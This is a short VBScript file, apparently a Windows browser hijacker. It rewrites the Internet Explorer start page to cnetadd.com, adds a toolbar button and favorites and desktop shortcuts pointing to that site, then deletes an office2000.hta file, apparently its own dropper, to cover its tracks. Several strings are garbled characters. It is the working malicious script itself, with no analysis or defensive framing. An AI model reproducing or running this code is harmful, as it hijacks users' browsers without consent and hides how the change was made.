Dim WSHShell,x,iepath,sp,ext,icon1,icon2
icon1=""
icon2=""
iepath="HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\"
ext=iepath &"Extensions\{8DE0FCD4-5EB5-11D3-AD25-00002100131c}\"
sp=iepath &"Main\Start Page"
x="http://www.cnetadd.com"
y="��������ַ��"
Set WSHShell = WScript.CreateObject("WScript.Shell")
Set oUrlLink = WshShell.CreateShortcut(Wscript.path & "\favorites\"& y & ".URL")
oUrlLink.TargetPath = x
oUrlLink.Save
Set deskLink = WshShell.CreateShortcut(Wscript.path & "\desktop\"& y & ".URL")
deskLink.TargetPath = x
deskLink.Save
WSHShell.RegWrite sp, x
WSHShell.RegWrite ext & "ButtonText","��ַ"
WSHShell.RegWrite ext & "CLSID","{1FBA04EE-3024-11d2-8F1F-0000F87ABD16}"
WSHShell.RegWrite ext & "ClsidExtension","{8DE0FCD4-5EB5-11D3-AD25-00002100131c}"
WSHShell.RegWrite ext & "Default Visible","Yes"
WSHShell.RegWrite ext & "Exec",x
WSHShell.RegWrite ext & "HotIcon",icon1
WSHShell.RegWrite ext & "Icon",icon2
Set fs = CreateObject("Scripting.FileSystemObject")
if fs.FileExists(wscript.path & "\Start Menu\Programs\����\office2000.hta") then
fs.deletefile(wscript.path & "\Start Menu\Programs\����\office2000.hta")
end if
